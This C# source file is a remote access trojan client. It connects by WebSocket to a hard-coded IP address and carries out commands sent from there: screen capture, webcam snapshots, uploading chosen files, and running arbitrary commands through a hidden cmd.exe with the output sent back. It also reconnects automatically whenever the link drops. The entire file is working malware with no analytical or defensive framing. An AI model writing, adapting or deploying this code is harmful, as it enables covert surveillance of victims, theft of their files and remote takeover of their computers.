using System;
using System.Diagnostics;
using WebSocketSharp;
using System.Threading;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Emgu.CV;

namespace A3
{
    class Program
    {
        static void Main(string[] args)
        {

            using (var ws = new WebSocket("ws://154.49.211.224"))
            {
                ws.OnMessage += (sender, e) =>
                {
                    String message;
                    message = e.Data;
                    if (message == "screenshot")
                    {
                        ws.Send("Please wait, generating screenshot...");
                        Bitmap memoryImage;
                        memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                        Screen.PrimaryScreen.Bounds.Height);
                        Size s = new Size(memoryImage.Width, memoryImage.Height);
                        Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                        memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                        
                        MemoryStream stream = new MemoryStream();
                        memoryImage.Save(stream, ImageFormat.Bmp);
                        byte[] imageBytes = stream.ToArray();
                        string base64String = Convert.ToBase64String(imageBytes);
                        ws.Send("##SCREENSHOT##"+ base64String);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if(message == "webcam_snap")
                    {
                        VideoCapture capture = new VideoCapture();
                        Bitmap image = capture.QueryFrame().Bitmap;
                        MemoryStream ms = new MemoryStream();
                        image.Save(ms, ImageFormat.Jpeg);
                        byte[] byteImage = ms.ToArray();
                        var SigBase64 = Convert.ToBase64String(byteImage);
                        ws.Send("##WEBCAM_SNAP##"+SigBase64);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }else if(message == "speedtest")
                    {
                        const string tempfile = "tempfile.tmp";
                        System.Net.WebClient webClient = new System.Net.WebClient();
                        Stopwatch sww = Stopwatch.StartNew();
                        webClient.DownloadFile("http://www.ovh.net/files/100Mio.dat", tempfile);
                        sww.Stop();

                        FileInfo fileInfo = new FileInfo(tempfile);
                        long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
                        string jj = "{\"duration\":\""+ sww.Elapsed.Milliseconds+"\",\"file_size\":\""+ fileInfo.Length.ToString("N0")+"\",\"speed\":\""+ speed.ToString("N0")+"\"}";
                        ws.Send("##SPEEDTEST##" + jj);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if(message.StartsWith("upload_file"))
                    {
                        string[] msg = message.Split(' ');
                        FileInfo info = new FileInfo(msg[1]);
                        ws.Send(info);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else
                    {
                        Process cmd = new Process();
                        cmd.StartInfo.FileName = "cmd.exe";
                        cmd.StartInfo.RedirectStandardInput = true;
                        cmd.StartInfo.RedirectStandardOutput = true;
                        cmd.StartInfo.CreateNoWindow = true;
                        cmd.StartInfo.UseShellExecute = false;
                        cmd.Start();

                        cmd.StandardInput.WriteLine(message);
                        cmd.StandardInput.Flush();
                        cmd.StandardInput.Close();
                        cmd.WaitForExit();
                        ws.Send(cmd.StandardOutput.ReadToEnd());
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                };
                ws.OnClose += (sender, e) => {
                    Stopwatch sw = new Stopwatch();
                    sw.Start();
                    while (true)
                    {
                        if(sw.ElapsedMilliseconds > 2000)
                        {
                            ws.Connect();
                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                            break;
                        }
                    }
                };
                ws.Connect();
                ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                new ManualResetEvent(false).WaitOne();
            }
        }
    }
}
